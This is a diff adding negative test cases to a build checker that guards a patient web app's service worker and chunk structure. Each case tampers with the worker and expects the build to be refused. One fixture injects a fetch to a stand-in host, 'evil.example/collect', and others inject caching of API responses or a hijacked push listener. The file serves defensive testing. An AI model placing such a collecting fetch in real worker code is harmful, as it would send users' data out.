@@ -115,7 +115,7 @@ const PUSH_DEVICE = 'async function t(){return"serviceWorker"in navigator?naviga
 const workerWith = (extra: string) => `${PUSH_WORKER}\n${extra}\n`
 /** The real sw.js as a pilot build writes it (vite.config.ts): the shell's file list in place of null. */
 const withShell = (assets: string[], extra: Record<string, unknown> = {}) => PUSH_WORKER.replace('self.__HID_SHELL__ = null',
-  `self.__HID_SHELL__ = ${JSON.stringify({ build: '0123456789abcdef', environment: 'production', debug: false, assets, ...extra })}`)
+  `self.__HID_SHELL__ = ${JSON.stringify({ build: '0123456789abcdef', environment: 'production', debug: false, entry: `/${ENTRY}`, assets, ...extra })}`)
 // What Vite makes of apps/patient-web/src/offline/shell.ts: the other chunk allowed the worker API.
 const SHELL_CHUNK = 'assets/shell-Ab12Cd34.js'
 const SHELL_CODE = 'async function n(){const e=navigator.serviceWorker;const t=await e.register("/sw.js",{scope:"/",updateViaCache:"none"});'
@@ -187,6 +187,29 @@ describe('the push worker (B6)', () => {
     ['a shell file list naming a file outside the shell', { 'sw.js': withShell(['/index.html']) }, /would keep \/index\.html/],
     ['a production shell with the debug panel on', { 'sw.js': withShell([`/${ENTRY}`], { debug: true }) },
       /production build with the offline debug panel on/],
+    ['a shell file list without the page\'s entry', { 'sw.js': withShell([`/${ENTRY}`], { entry: undefined }) },
+      /not \{ build, environment, debug, entry, assets \}/],
+    ['an entry that is not the built page\'s module script', { 'sw.js': withShell([`/${ENTRY}`, `/${STYLE}`], { entry: `/${STYLE}` }) },
+      /names \/assets\/index-GhIjKl34\.css as the page's entry/],
+    ['runtime caching under the shell prefix', { 'sw.js': withShell([`/${ENTRY}`]).replace("const navigation = request.mode === 'navigate'",
+      "caches.open(SHELL_PREFIX + 'runtime').then(cache => cache.put(request, new Response('')))\n  const navigation = request.mode === 'navigate'") },
+      /writes to the Cache API outside precacheShell/],
+    ['a cross-origin fetch on a message', { 'sw.js': withShell([`/${ENTRY}`]).replace("event.waitUntil(purgeShell())",
+      "event.waitUntil(purgeShell().then(() => fetch('https://evil.example/collect')))") }, /fetches other than/],
+    ['a push listener that calls a helper doing more', { 'sw.js': PUSH_WORKER.replace('event.waitUntil(self.registration.showNotification(TITLE, OPTIONS))',
+      'event.waitUntil(notify())').replace('const TARGET_PATH', 'async function notify() { await shellResponse(new Request(\'/\'), \'/\', true); '
+      + 'return self.registration.showNotification(TITLE, OPTIONS) }\nconst TARGET_PATH') }, /push and tap listeners are not the ones B6 shipped/],
+    ['an API branch that caches inside the guard', { 'sw.js': withShell([`/${ENTRY}`]).replace(
+      "if (path === '/api' || path.startsWith('/api/') || path === '/sw.js' || path === '/service-worker.js') return",
+      "if (path === '/api' || path.startsWith('/api/')) {\n    event.respondWith(fetch(request).then(answer => caches.open(SHELL_PREFIX + SHELL.build)"
+      + ".then(cache => cache.put(request, answer.clone())).then(() => answer)))\n    return\n  }\n  if (path === '/sw.js' || path === '/service-worker.js') return") },
+      /writes to the Cache API outside precacheShell|answers requests other than through shellResponse|fetches other than/],
+    ['a page that preloads the shell\'s chunk', { [SHELL_CHUNK]: SHELL_CODE },
+      /index\.html preloads assets\/shell-Ab12Cd34\.js/, built.replace('</head>', `  <link rel="modulepreload" crossorigin href="/${SHELL_CHUNK}">\n  </head>`)],
+    ['a page that preloads pushDevice\'s chunk', {},
+      /index\.html preloads assets\/pushDevice-Qr5tUv78\.js/, built.replace('</head>', `  <link rel="modulepreload" crossorigin href="/${PUSH_DEVICE_CHUNK}">\n  </head>`)],
+    ['a chunk that imports the shell\'s chunk statically', { [SHELL_CHUNK]: SHELL_CODE, [ENTRY]: 'import{n as e}from"./shell-Ab12Cd34.js";e()\n' },
+      /index-AbCdEf12\.js imports assets\/shell-Ab12Cd34\.js statically/],
     ['a shell file list set twice', { 'sw.js': `${withShell([`/${ENTRY}`])}self.__HID_SHELL__ = null\n` }, /set self\.__HID_SHELL__ exactly once/],
     ['a worker anywhere but the root', { 'icons/sw.js': PUSH_WORKER }, /icons\/sw\.js is a service worker/],
     ['the worker API outside pushDevice\'s and the shell\'s chunks', { [ENTRY]: 'navigator.serviceWorker.register("/sw.js")\n' },
@@ -197,8 +220,8 @@ describe('the push worker (B6)', () => {
       /registers \(e\.url\); only \/sw\.js may be registered/],
     ['a shell chunk that registers another script', { [SHELL_CHUNK]: SHELL_CODE.replace('"/sw.js"', '"/offline-sw.js"') },
       /shell-Ab12Cd34\.js registers \/offline-sw\.js; only \/sw\.js may be registered/],
-  ])('refuses %s', (_name, files, reason) => {
-    const result = launchBuildCheck(built, { [PUSH_DEVICE_CHUNK]: PUSH_DEVICE, ...files })
+  ])('refuses %s', (_name, files, reason, html = built) => {
+    const result = launchBuildCheck(html, { [PUSH_DEVICE_CHUNK]: PUSH_DEVICE, ...files })
     expect(result.status).toBe(1)
     expect(result.output).toMatch(reason)
   })
